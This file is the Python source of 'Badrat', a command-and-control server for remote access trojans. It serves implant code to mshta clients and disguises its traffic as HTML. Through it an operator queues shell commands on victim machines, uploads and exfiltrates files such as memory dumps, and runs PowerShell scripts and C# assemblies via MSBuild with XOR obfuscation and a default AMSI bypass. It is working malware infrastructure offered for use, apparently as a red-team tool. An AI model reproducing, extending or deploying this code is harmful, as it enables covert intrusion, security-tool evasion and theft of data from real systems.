#!/usr/bin/env python3

from flask import Flask, request
from datetime import datetime
from itertools import cycle
from pathlib import Path

import threading
import argparse
import readline
import logging
import random
import base64
import time
import json
import sys
import os
import re

# CSCI 201 teacher: Noooo you can't just use global variables to make things easier
# haha, global variables go brrr

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--port", help="Port to start the HTTP(S) server on", default=8080, action="store", dest="port")
parser.add_argument("-s", "--ssl", help="Start listener using HTTPS instead of HTTP (default)", default=False, action="store_true", dest="ssl")
parser.add_argument("-v", "--verbose", help="Start Badrat in debug/verbose mode for troubleshooting", default=False, action="store_true", dest="verbose")
args = parser.parse_args()
port = args.port
ssl = args.ssl
verbose = args.verbose

supported_types = ["c", "c#", "js", "ps1", "hta"]
msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild"
alpha = "abcdefghijklmnopqrstuvwxyz"

# Only applies to hta and js rats
prepend_amsi_bypass_to_psh = True

# I should probably make a dict of dicts...
commands = {}
rats = {}
types = {}
usernames = {}

# Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
class Completer(object):
    def __init__(self):
        self.tab_cmds = ['rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear']
        self.re_space = re.compile('.*\s+$', re.M)

    def add_tab_item(self, item):
        self.tab_cmds.append(item)

    def remove_tab_item(self, item):
        self.tab_cmds.remove(item)

    def _listdir(self, root):
        "List directory 'root' appending the path separator to subdirs."
        res = []
        for name in os.listdir(root):
            path = os.path.join(root, name)
            if os.path.isdir(path):
                name += os.sep
            res.append(name)
        return res

    def _complete_path(self, path=None):
        "Perform completion of filesystem path."
        if not path:
            return self._listdir('.')
        dirname, rest = os.path.split(path)
        tmp = dirname if dirname else '.'
        res = [os.path.join(dirname, p)
                for p in self._listdir(tmp) if p.startswith(rest)]
        # more than one match, or single match which does not exist (typo)
        if len(res) > 1 or not os.path.exists(path):
            return res
        # resolved to a single directory, so return list of files below it
        if os.path.isdir(path):
            return [os.path.join(path, p) for p in self._listdir(path)]
        # exact file match terminates this completion
        return [path + ' ']

    # Fix this ... 'remove <tab>' should complete the rat id
    def _complete_rat(self, rat=None):
        if not rat:
            return rats.keys()
        if(rat in rats.keys()):
            return [rat + ' ']

    def complete_upload(self, args):
        return self._complete_path(args[0])

    def complete_psh(self, args):
        return self._complete_path(args[0])

    def complete_csharp(self, args):
        return self._complete_path(args[0])

    def complete_remove(self, args):
        return self._complete_rat(args[0])

    def complete(self, text, state):
        "Generic readline completion entry point."
        buffer = readline.get_line_buffer()
        line = readline.get_line_buffer().split()
        # show all commands
        if not line:
            return [c + ' ' for c in self.tab_cmds][state]
        # account for last argument ending in a space
        if self.re_space.match(buffer):
            line.append('')
        # resolve command to the implementation function
        cmd = line[0].strip()
        if cmd in self.tab_cmds:
            impl = getattr(self, 'complete_%s' % cmd)
            args = line[1:]
            if args:
                return (impl(args) + [None])[state]
            return [cmd + ' '][state]
        results = [c + ' ' for c in self.tab_cmds if c.startswith(cmd)] + [None]
        return results[state]

comp = Completer()
# we want to treat '/' as part of a word, so override the delimiters
readline.set_completer_delims(' \t\n;')
readline.parse_and_bind("tab: complete")
readline.set_completer(comp.complete)

def print_banner():
    banner = """
    $$\                       $$\                       $$\                             _
    $$ |                      $$ |                      $$ |                          (( )_,    ,
    $$$$$$$\   $$$$$$\   $$$$$$$ | $$$$$$\   $$$$$$\  $$$$$$\    $$$$$$$\    .--.     \ '/     /.\\
    $$  __$$\  \____$$\ $$  __$$ |$$  __$$\  \____$$\ \_$$  _|  $$  _____|       )    / \=    /O o\     _
    $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
    $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
    $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.2.2 Tabulatory Completion    "`
    """
    print(banner)

# Required function for interactive history
def history(numlines=-1):
    total = readline.get_current_history_length()
    if(numlines == -1):
        numlines = total
    if(numlines > 0):
        for i in range(total - numlines, total):
            print(readline.get_history_item(i + 1))

# Wrap C2 comms in html and html2 code to make requests look more legitimate
def htmlify(data):
    html = "<html><head><title>http server</title></head>\n"
    html += "<body>\n"
    html += "<b>\n"
    html2 = "</b>\n"
    html2 += "</body>\n"
    html2 += "</html>\n"
    return(html + data + "\n" + html2)

# Print colors according to the rat type
def colors(value):
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'
    c = '\033[91m'    # Red
    cs = '\033[92m'   # Green
    js = '\033[93m'   # Yellow
    ps1 = '\033[94m'  # Blue
    hta = '\033[95m'  # Purple
    colors = {"c":c, "c#":cs, "js":js, "ps1":ps1, "hta":hta}
    if(value in colors.keys()):
        return(colors[value] + value + ENDC)
    elif(value in types.keys()):
        return(colors[types[value]] + value + ENDC)
    elif(value == "all"):
        return(BOLD + "ALL RATS" + ENDC)
    elif(value == ">>"):
        return( BOLD + c + ">" + js + ">" + ENDC)
    elif(value == "quit"):
        return(c + "commit Seppuku" + ENDC)
    elif(value == "HTTP"):
        return(BOLD + js + value + ENDC)
    elif(value == "HTTPS"):
        return(BOLD + py +value + ENDC)
    try:
        checkin = datetime.strptime(value, "%H:%M:%S")
        delta_seconds = (datetime.now() - checkin).seconds
        if(delta_seconds > 21):
            return(BOLD + c + value + ENDC)
        elif(delta_seconds > 7):
            return(BOLD + js + value + ENDC)
        else:
            return(BOLD + cs + value + ENDC)
    except:
        # Truncate reeeeally long commands over 120 characters
        if(len(value) > 120 and not verbose):
            return(UNDERLINE + value[0:116] + ENDC + "...")
        else:
            return(UNDERLINE + value + ENDC)


# Page sent to "unauthorized" users of the http listener
def default_page():
    message = "WTF who are you go away"
    return(htmlify(message))

# Allow rats to call home and request more ratcode of their own type
def send_ratcode(ratID):
    print("\n[*] sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
    with open(os.getcwd() + "/rats/badrat." + types[ratID], 'r') as fd:
        ratcode = fd.read()
        ratcode = base64.b64encode(ratcode.encode('utf-8')).decode('utf-8')
        return(ratcode)

def encode_file(filepath):
    with open(Path(filepath).resolve() , "rb") as fd:
        data = fd.read()
    b64data = base64.b64encode(data).decode('utf-8')
    return(b64data)

def create_psscript(filepath, extra_cmds=""):
    with open(Path(filepath).resolve() , "r") as fd:
        data = fd.read()
        if(extra_cmds):
            data += "\n" + extra_cmds

        b64data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
        return(b64data)

def send_invoke_assembly(input_data):
    assembly_path = input_data.split(" ")[1]

    with open(os.getcwd() + "/resources/Invoke-Assembly.ps1" , "r") as fd:
        invoke_assembly_data = fd.read()

    with open(Path(assembly_path).resolve() , "rb") as fd:
        assembly_data = fd.read()

    invoke_assembly_data = invoke_assembly_data.replace("~~ARGUMENTS~~", parse_c_sharp_args(input_data))
    invoke_assembly_data = invoke_assembly_data.replace("~~ASSEMBLY~~", base64.b64encode(assembly_data).decode('utf-8'))
    b64data = base64.b64encode(invoke_assembly_data.encode('utf-8')).decode('utf-8')
    return(b64data)

def send_nps_msbuild_xml(input_data, ratID):
    ps_script_path = input_data.split(" ")[1]
    amsi_data = ""
    extra_cmds = ""
    try:
        extra_cmds = " ".join(input_data.split(" ")[2:])
    except:
        pass

    with open(os.getcwd() + "/resources/nps_modified.xml" , "r") as fd:
        msbuild_data = fd.read()

    if(prepend_amsi_bypass_to_psh):
        with open(os.getcwd() + "/resources/Disable-Amsi.ps1" , "rb") as fd:
            amsi_data = fd.read()

    with open(Path(ps_script_path).resolve() , "rb") as fd:
        script_data = fd.read()
        if(extra_cmds):
            script_data += b"\n" + bytes(extra_cmds, 'utf-8')

    msbuild_data = msbuild_data.replace("~~KEY~~",  ratID)
    msbuild_data = msbuild_data.replace("~~AMSI~~", xor_crypt_and_encode(amsi_data, ratID))
    msbuild_data = msbuild_data.replace("~~SCRIPT~~", xor_crypt_and_encode(script_data, ratID))
    b64data =  base64.b64encode(msbuild_data.encode('utf-8')).decode('utf-8')
    return(b64data)

def send_csharper_msbuild_xml(input_data, ratID):
    assembly_path = input_data.split(" ")[1]

    with open(os.getcwd() + "/resources/csharper_modified.xml" , "r") as fd:
        csharper_data = fd.read()

    with open(Path(assembly_path).resolve() , "rb") as fd:
        assembly_data = fd.read()

    csharper_data = csharper_data.replace("~~KEY~~", ratID)
    csharper_data = csharper_data.replace("~~ARGS~~", parse_c_sharp_args(input_data))
    csharper_data = csharper_data.replace("~~ASSEMBLY~~", xor_crypt_and_encode(assembly_data, ratID))
    b64data = base64.b64encode(csharper_data.encode('utf-8')).decode('utf-8')
    return(b64data)

# Parses an operator's "cs" line to the correct format needed in msbuild xml file
# Example: cs SharpDump.exe arg1 arg2 "third arg" -> "arg1","arg2","third arg"
def parse_c_sharp_args(argument_string):
    stringlist = []
    stringbuilder = ""
    inside_quotes = False

    args = argument_string.split(" ")[2:]
    args = " ".join(args)

    if(not args):
        return('""')
    for ch in args:
        if(ch == " " and not inside_quotes):
            stringlist.append(stringbuilder) # Add finished string to the list
            stringbuilder = "" # Reset the string
        elif(ch == '"'):
            inside_quotes = not inside_quotes
        else: # Ch is a normal character
            stringbuilder += ch # Add next ch to string

    # Finally...
    stringlist.append(stringbuilder)
    for arg in stringlist:
        if(arg == ""):
            stringlist.remove(arg)

    argument_string = '","'.join(stringlist)
    # Replace backslashes with a literal backslash so an operator can type a file path like C:\windows\system32 instead of C:\\windows\\system32
    argument_string = argument_string.replace("\\", "\\\\")
    return('"' + argument_string + '"')

# Simple xor cipher to encrypt C# binaries and encode them into a base64 string
def xor_crypt_and_encode(data, key):
     xored = []
     for (x,y) in zip(data, cycle(key)):
         xored.append(x ^ ord(y))
     return(base64.b64encode(bytes(xored)).decode('utf-8'))

def serve_server(port=8080):
    app = Flask(__name__)

    # Disable annoying console output for GET/POST requests
    log = logging.getLogger('werkzeug')
    log.disabled = True

    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>', methods=['GET'])
    def badrat_get(path):
        user_agent = request.headers['User-Agent']
        # Path must be /documents/b.hta AND user agent belongs to mshta.exe
        # Easy way to serve HTA's
        if("/documents/b.hta" in path and "MSIE" in user_agent and ".NET" in user_agent and "Windows NT" in user_agent):
            return(send_ratcode(ratID))
        elif(verbose):
            print("[v] GET request from non-rat client requested path /" + path)
        return(default_page())

    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>', methods=['POST'])
    def badrat_comms(path):
        # Parse POST parameters
        post_json = request.get_json(force=True)
        post_dict = dict(post_json)
        try:
            ratID = str(post_dict['id'])
            ratType = str(post_dict['type'])
            if(ratType not in supported_types):
                ratType = "?"
            username = str(post_dict['un'])
        except:
            print("\n[!] Failed to grab id, type, or user param from POST request")
            return(default_page())

        # Update checkin time for an agent every checkin
        checkin = datetime.now().strftime("%H:%M:%S")
        rats[ratID] = checkin
        types[ratID] = ratType
        usernames[ratID] = username
        if(verbose):
            print("[v] rat " + colors(ratID) + " sent data: " + str(post_json))

        # If there is no current command for a rat, create a blank one
        if(ratID not in commands):
            commands[ratID] = ""
            comp.add_tab_item(ratID)
            print("\n[*] New rat checked in: " + colors(ratID))

        if("retval" in post_dict.keys()):
            commands[ratID] = ""
            print("\n[*] Results from rat " + colors(str(post_dict['id'])) + ":\n")
            print(base64.b64decode(post_dict['retval']).decode('utf-8'))

        if("dl" in post_dict.keys()):
            commands[ratID] = "" # Reset command back to "" (blank) after we finish processing the results
            rand = ''.join(random.choice(alpha) for choice in range(10)) 
            with open(Path("downloads/" + ratID + "." + rand).resolve() , "wb") as fd:
                fd.write(base64.b64decode(post_dict['dl']))
            print("\n[*] File download from rat " + colors(ratID) + " saved to " + colors("downloads/" + colors(ratID)) + colors("." + rand))

        return(htmlify(json.dumps({"cmnd": commands[ratID]})))

    if(verbose):
        print("[v] Starting badrat in verbose mode. Prepare to have your screen flooded.")

    # Run the listener. Choose between HTTP and HTTPS based on if --ssl was specfied
    if(ssl):
        print("[*] Starting " + colors("HTTPS") + " listener on port " + str(port))
        print("[*] Certificate file: " + colors("cert/cert.pem") +" Private key file: " + colors("cert/privkey.pem") + "\n\n")
        app.run(host="0.0.0.0", port=port, ssl_context=("cert/cert.pem", "cert/privkey.pem"))
    else:
        print("[*] Starting " + colors("HTTP") + " listener on port " + str(port) + "\n\n")
        app.run(host="0.0.0.0", port=port)

    print("HTA's servable from path: " + colors("/documents/b.hta"))

def get_rats(current=""):
    print("\n    implant id \ttype\tcheck-in\tusername")
    print("    ----------\t----\t--------\t--------")
    for ratID, checkin in rats.items():
        if(current == ratID or current == "all"):
            print(" "+colors(">>")+" "+ratID+" \t"+colors(types[ratID])+"  \t"+colors(checkin)+" \t"+usernames[ratID])
        else:
            print("    "+ratID+" \t"+colors(types[ratID])+"  \t"+colors(checkin)+" \t"+usernames[ratID])
    print("")

def remove_rat(ratID):
    if(ratID == "all"):
        print("[*] Removing ALL rats")
        for ratID in rats.keys():
            comp.remove_tab_item(ratID)
        rats.clear()
        types.clear()
    else:
        try:
            comp.remove_tab_item(ratID)
            del rats[ratID]
            del types[ratID]
            print("[*] Removing rat " + ratID)
        except:
            print("[!] Can't delete rat " + ratID + " for some reason")

def get_help():
    print("\nBadrats is a collection of rats designed for initial access. Rats are designed to be small and have few features.")
    print("For better post exploit functionality, execution should be passed off to other C2 frameworks")
    print("-------------------------------------------------------------------------")
    print("")
    print("Server commands: -- commands to control the badrat server")
    print("help -- it's this help page, duh")
    print("rats/agents/sessions -- gets the list of rats and their last checkin time")
    print("exit -- exits the badrat console and shuts down the listener")
    print("<ratID> -- start interacting with the specified rat")
    print("all -- start interacting with ALL rats")
    print("back -- backgrounds the current rat and goes to the main menu")
    print("remove all -- unregisters ALL rats")
    print("remove <ratID> -- unregisters the specified <ratID>")
    print("clear -- clear the screen")
    print("")
    print("Rat commands: -- commands to interact with a badrat rat")
    print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on rat type")
    print("quit/kill_rat -- when interacting with a rat, type quit or kill_rat to task the rat to shut down")
    print("spawn -- used to spawn a new rat in a new process.")
    print("psh <local_powershell_script_path> <extra powershell commands> -- Runs the powershell script on the rat. Uses MSBuild.exe or powershell.exe depending on the agent type")
    print("example: psh script/Invoke-SocksProxy.ps1 Invoke-ReverseSocksProxy -remotePort 4444 -remoteHost 12.23.34.45")
    print("cs <local_c_sharp_exe_path> <command_arguments> -- Runs the assembly on the remote host using MSBuild.exe and a C Sharp reflective loader stub")
    print("example: cs scripts/Snaffler.exe --domain borgar.local --stdout")
    print("up/upload -- Uploads file from C2 server to rat host")
    print("example: upload scripts/Invoke-Bloodhound.ps1 C:\\users\\localadmin\\desktop\\ibh.ps1")
    print("dl/download -- downloads the specified file from the rat host")
    print("example: download C:\\users\\localadmin\\desktop\\minidump_660.dmp")
    print("-------------------------------------------------------------------------")
    print("")
    print("Extra things to know:")
    print("The rats are written in Windows JScript, Powershell and C#, run in a cscript.exe/wscript.exe, mshta.exe, powershell.exe, or standard exe process")
    print("The server is written in python and uses an HTTP(S) listener for C2 comms")
    print("Rats are SINGLE THREADED, which means long running commands will lock up the rat. Try spawning a new rat before running risky commands")
    print("Some rats need to write to disk for execution or cmd output. Every rat that must write to disk cleans up files created.")
    print("By default, rat communications are NOT SECURE. Do not send sensitive info through the C2 channel unless using SSL")
    print("Rats are designed to use methods native to their type as much as possible. E.g.: HTA rat will never use Powershell.exe, and the Powershell rat will never use cmd.exe")
    print("Tal Liberman's AMSI Bypass is included by default for msbuild psh execution (js and hta ONLY). This may not be desireable and can be turned off by changing the variable at the beginning of this script")
    print("All assemblies run with \"cs\" must be compiled with a public Main method and a public class that contains Main\n")

if __name__ == "__main__":
    # Start the Flask server
    server = threading.Thread(target=serve_server, kwargs=dict(port=port), daemon=True)
    server.start()
    time.sleep(0.5)
    if not server.is_alive():
        print("\n[!] Could not start listener!")
        sys.exit()
    else:
        print_banner()

    # Badrat main menu loop
    while True:
        inp = input(colors("Badrat") + " //> ")

        # Check if input has a trailing space, like 'exit ' instead of 'exit' -- for tab completion
        inp = inp.strip(" ")

        # Check if the operator wants to quit badrat
        if(inp == "exit"):
            print("[*] Shutting down badrat listener")
            sys.exit()

        # Gets the help info
        elif(inp == "help"):
            get_help()

        # View rats, their types, and their latest checkin times
        elif(inp == "agents" or inp == "rats" or inp == "implants" or inp == "sessions"):
            get_rats()

        # Remove rats -- either by ratID or all
        elif(str.startswith(inp, "remove")):
            if(str.startswith(inp, "all", 6, 3)):
                remove_rat("all")
            else:
                remove_rat(inp.split(" ")[1])

        # Clear the screen
        elif(inp == "clear"):
            os.system("clear")

        # Enter rat specific command prompt
        elif(inp in rats.keys() or inp == "all"):
            ratID = inp

            # Interact-with-rat loop
            while True:
                inp = input(colors(ratID) + " \\\\> ")

                if(inp != ""):
                    inp = inp.strip(" ")

                    if(inp == "back" or inp == "exit"):
                        break

                    elif(inp == "agents" or inp == "rats" or inp == "implants" or inp == "sessions"):
                        get_rats(ratID)
                        continue

                    elif(inp == "clear"):
                        os.system("clear")
                        continue

                    elif(inp == "help"):
                        get_help()
                        continue

                    elif(inp == "quit"):
                        inp = "quit"

                    elif(inp == "spawn"):
                        if(types[ratID] == "ps1" or types[ratID] == "hta"):
                            inp = "spawn " + send_ratcode(ratID)

                    elif(str.startswith(inp, "psh ")):
                        try:
                            filepath = inp.split(" ")[1]
                            extra_cmds = ""
                            try:
                                extra_cmds = " ".join(inp.split(" ")[2:])
                            except:
                                pass
                            if(types[ratID] == "ps1" or types[ratID] == "c#"):
                                inp = "psh " + create_psscript(filepath, extra_cmds)
                            else:
                                inp = "psh " + msbuild_path + " " + send_nps_msbuild_xml(inp, ratID)
                        except:
                            print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                            continue

                    elif(str.startswith(inp, "cs ") or str.startswith(inp, "csharp ")):
                        try:
                            filepath = inp.split(" ")[1]
                            if(types[ratID] == "ps1"):
                                inp = "cs " + send_invoke_assembly(inp)
                            elif(types[ratID] == "c#"):
                                inp = "cs " + encode_file(filepath) + " " + parse_c_sharp_args(inp)
                            else:
                                inp = "cs " + msbuild_path + " " + send_csharper_msbuild_xml(inp, ratID)
                        except:
                            print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                            continue

                    elif(str.startswith(inp, "up ") or str.startswith(inp, "upload ")):
                        try:
                            localpath = inp.split(" ")[1]
                            remotepath = inp.split(" ")[2] #BAD -- does not account for remote paths that contain space: "C:\Program Files\whatever.txt"
                            remotepath = remotepath.replace("\\", "\\\\")
                            inp = "up " + encode_file(localpath) + " " + remotepath
                        except:
                            print("[!] Could not open file " + colors(localpath) + " for reading or no remote path specified")
                            continue

                    # Alias download=dl
                    elif(str.startswith(inp, "dl ") or str.startswith(inp, "download ")):
                        inp = " ".join(inp.split(" ")[1:])
                        inp = "dl " + inp

                    print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
                    if(ratID == "all"):
                    # update ALL commands
                        for i in commands.keys():
                            commands[i] = inp
                    else:
                        commands[ratID] = inp
